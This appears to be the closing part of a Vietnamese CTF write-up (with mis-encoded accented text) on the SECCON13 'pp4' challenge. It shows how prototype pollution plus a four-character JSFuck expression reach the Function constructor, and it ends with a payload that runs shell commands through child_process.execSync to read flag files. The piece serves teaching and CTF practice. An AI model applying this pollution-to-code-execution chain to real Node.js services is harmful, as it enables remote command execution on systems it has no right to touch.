<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details></div><p>B√†i y√™u c·∫ßu ng∆∞·ªùi d√πng nh·∫≠p v√†o m·ªôt JSON ƒë·ªÉ pollute prototype v√† sau ƒë√≥ eval code v·ªõi 4 k√≠ t·ª±. JSFuck b√¨nh th∆∞·ªùng c·∫ßn s·ª≠ d·ª•ng ƒë·∫øn 6 k√≠ t·ª± n√™n ta c·∫ßn ph·∫£i t√¨m c√°ch pollute ƒë∆∞·ª£c prototype n√†o ƒë√≥ ƒë·ªÉ c√≥ th·ªÉ ch·∫°y code b·∫•t k√¨ ch·ªâ v·ªõi 4 k√≠ t·ª±.</p><p>Ch·ªâ nh·∫≠p v√†o ƒë∆∞·ª£c 4 k√≠ t·ª± n√™n ta c·∫ßn pollute code v√† s·ª≠ d·ª•ng Object Function ƒë·ªÉ ch·∫°y ƒëo·∫°n code ƒë√≥.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">&quot;code&quot;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre></div><p>ƒêo·∫°n code tr√™n s·∫Ω t·∫°o anonymous function sau ƒë√≥ execute function ƒë√≥. Gi·ªù ta c·∫ßn chuy·ªÉn qua jsfuck ƒë·ªÉ c√≥ th·ªÉ execute code. JSFuck th√¥ng th∆∞·ªùng c√≥ 6 k√≠ t·ª± <code>[]()!+</code>, tuy nhi√™n trong n√†y ch·ªâ ƒë∆∞·ª£c 4 k√≠ t·ª±. N√™n ta c·∫ßn ch·ªçn ra 4 k√≠ t·ª± c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c trong b√†i n√†y. Tr∆∞·ªõc h·∫øt ta c·∫ßn <code>()</code> ƒë·ªÉ c√≥ th·ªÉ invoke function. Hai k√≠ t·ª± c√≤n l·∫°i c√≥ th·ªÉ t·∫≠n d·ª•ng ƒë∆∞·ª£c ƒë·ªÉ l√†m nhi·ªÅu th·ª© kh√°c l√† <code>[]</code>.</p><p><code>[]</code> l√† Array, c√°c prototype c·ªßa n√≥ bao g·ªìm nh·ªØng h√†m thu·ªôc object Function, nh∆∞ v·∫≠y ta c·∫ßn t√¨m c√°ch g·ªçi ƒë·∫øn m·ªôt trong nh·ªØng prototype d∆∞·ªõi ƒë√¢y ƒë·ªÉ c√≥ ƒë∆∞·ª£c object Function <img src="/assets/prototype-pollution-bios-15-DxnkYBoi.png" alt="alt text"> Sau khi c√≥ ƒë∆∞·ª£c ƒë·∫øn Function b·∫•t k√¨, ta c√≥ th·ªÉ truy c·∫≠p ƒë·∫øn <code>constructor</code> c·ªßa n√≥ ƒë·ªÉ g·ªçi ƒë∆∞·ª£c object Function <img src="/assets/prototype-pollution-bios-16-BNhyS9ID.png" alt="alt text"></p><p>V·∫•n ƒë·ªÅ b√¢y gi·ªù l√† l√†m sao ch·ªâ d·ª±a v√†o 4 k√≠ t·ª± <code>[]()</code> ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c <code>constructor</code>. <code>[]</code> l√† k√≠ t·ª± kh√° ƒë·∫∑c bi·ªát, kh√¥ng ch·ªâ l√† Array m√† c√≤n l√† c√°ch ƒë·ªÉ truy c·∫≠p m·ªôt thu·ªôc t√≠nh c·ªßa object. Ta ph·∫£i t√¨m c√°ch pollute ƒë·ªÉ c√≥ th·ªÉ g·ªçi ƒë·∫øn string &quot;constructor&quot;. Khi s·ª≠ d·ª•ng bracket notation, t√™n thu·ªôc t√≠nh tr∆∞·ªõc h·∫øt s·∫Ω ƒë∆∞·ª£c chuy·ªÉn qua String. V√≠ d·ª• v·ªõi object <code>a</code>, khi truy c·∫≠p ƒë·∫øn m·ªôt thu·ªôc t√≠nh kh√¥ng t·ªìn t·∫°i, s·∫Ω tr·∫£ v·ªÅ <code>undefined</code>, convert qua String s·∫Ω th√†nh chu·ªói <code>&quot;undefined&quot;</code>. Nh∆∞ th·∫ø ta ch·ªâ c·∫ßn pollute <code>&quot;undefined&quot; = &quot;constructor&quot;</code><img src="/assets/prototype-pollution-bios-17-CHn9GA99.png" alt="alt text"> Khi chuy·ªÉn sang jsfuck, ta c√≥ th·ªÉ cho Array truy c·∫≠p ƒë·∫øn m·ªôt property r·ªóng</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span></span>
<span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>
<span class="line"></span></code></pre></div><p>Nh∆∞ v·∫≠y, ta ƒë√£ c√≥ ƒë∆∞·ª£c object Function. B√¢y gi·ªù ta c·∫ßn pollute ƒë·ªÉ c√≥ th·ªÉ l∆∞u ƒë∆∞·ª£c ƒëo·∫°n code c·ªßa m√¨nh v√†o. D·ª±a v√†o payload ·ªü tr√™n. Khi ta s·ª≠ d·ª•ng <code>[][[]]</code> l√† ƒëang truy c·∫≠p ƒë·∫øn m·ªôt property v·ªõi chu·ªói r·ªóng, ta c√≥ th·ªÉ pollute chu·ªói n√†y ƒë·ªÉ ch·ª©a execute code</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>
<span class="line"></span></code></pre></div><p>L√∫c n√†y, ta c·∫ßn ph·∫£i ch·ªânh l·∫°i payload ph√≠a tr√™n m·ªôt t√≠ ƒë·ªÉ c√≥ th·ªÉ ra ƒë∆∞·ª£c chu·ªói <code>&quot;constructor&quot;</code> v√¨ <code>Array[&quot;&quot;]</code> l√∫c n√†y kh√¥ng c√≤n l√† undefined. C√°ch s·ª≠a r·∫•t ƒë∆°n gi·∫£n l√† pollute <code>console.log(123)</code> v·ªÅ <code>&quot;constructor&quot;</code>.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>
<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;console.log(123)&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>
<span class="line"></span>
<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>
<span class="line"></span></code></pre></div><p><img src="/assets/prototype-pollution-bios-18-QMEJo5Gf.png" alt="alt text"> B√¢y gi·ªù ch·ªâ c·∫ßn chuy·ªÉn sang Jsfuck v·ªõi 4 k√≠ t·ª± <code>[]()</code> l√† xong.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token constant">INPUT_JSON</span> <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token string-property property">&quot;constructor&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token string-property property">&quot;prototype&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="line">      <span class="token string-property property">&quot;&quot;</span><span class="token operator">:</span> <span class="token string">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token punctuation">,</span></span>
<span class="line">      <span class="token string-property property">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token operator">:</span> <span class="token string">&quot;constructor&quot;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"><span class="token constant">INPUT_CODE</span> <span class="token operator">=</span> <span class="token string">&quot;[][[][[][[]]]][[][[][[]]]]([][[]])()&quot;</span></span>
<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token constant">INPUT_JSON</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">INPUT_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div></div><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Last Updated 12/16/2024, 9:07:24 AM<!--]--></span></span></div></footer><!----><!----></div><div class="page-catalog-container"><h5 class="tip">ON THIS PAGE</h5><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#object-trong-javascript" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Object trong JavaScript"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Object trong JavaScript<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#object-prototypes" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Object Prototypes"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Object Prototypes<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#protoype-chain" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Protoype chain"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Protoype chain<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#prototype-pollution" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Prototype Pollution"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Prototype Pollution<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#so-luoc" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="S∆° l∆∞·ª£c"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->S∆° l∆∞·ª£c<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#nguyen-nhan" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Nguy√™n nh√¢n"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Nguy√™n nh√¢n<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#challenge" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Challenge:"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Challenge:<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#bi0s-required-note" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="bi0s/required note"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->bi0s/required note<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blogs/CTF/2024/prototype-pollution-bios.html#seccon13-pp4" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="seccon13/pp4"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->seccon13/pp4<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--]--></ul></div></main><!--]--></div></div><!--[--><!----><!----><!--]--><!--]--></div>
    <script type="module" src="/assets/app-BJjiZhLy.js" defer></script>
  </body>
</html>
